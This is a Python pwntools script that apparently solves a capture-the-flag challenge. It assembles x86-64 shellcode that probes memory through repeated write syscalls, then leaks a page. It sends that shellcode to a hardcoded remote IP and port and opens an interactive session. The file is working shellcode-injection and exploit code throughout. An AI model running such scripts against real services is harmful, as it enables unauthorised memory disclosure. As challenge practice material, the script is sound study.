#!/usr/bin/python3
from pwn import *
from keystone import *

context.terminal = ["gnome-terminal", "--execute"]



ks = Ks(KS_ARCH_X86, KS_MODE_64)

def compile_shellcode(shellcode) :
    result = bytearray()
    for instruction in shellcode : 
        encoding, _ = ks.asm(instruction)
        for byt in encoding : 
            result.append(byt)
    return result

shellcode = []
# set up our oracle
shellcode_start = 0x690000
shellcode.append("mov rsi, 0x4200000")
shellcode.append("add rsi, 0x1000")
shellcode.append("mov rax, 1")
shellcode.append("mov rdi, 1")
shellcode.append("mov rdx, 1")
shellcode.append("syscall")
shellcode.append("cmp rax, 1")
shellcode.append("je 0xa")
old_len = len(compile_shellcode(shellcode))
shellcode.append("mov rbx, 0x690007")
shellcode.append("jmp rbx")
print("Len: " + str(len(compile_shellcode(shellcode)) - old_len))
#do the syscall
shellcode.append("mov rdx, 0x1000")
shellcode.append("syscall")

#sock = process(argv=["./ihnsaims", "jflaskdjflksadjflkasdjfsdfoiwu"])
#gdb.attach(sock)
sock = remote("54.85.45.101", 8002)

raw_input("hey")
sock.sendlineafter("pick a number", str(1))

compiled_shellcode = compile_shellcode(shellcode)
sock.sendlineafter("execute!", compiled_shellcode)
sock.recvuntil("luck!\n")
output = sock.recv()
print(output.hex())
sock.interactive()
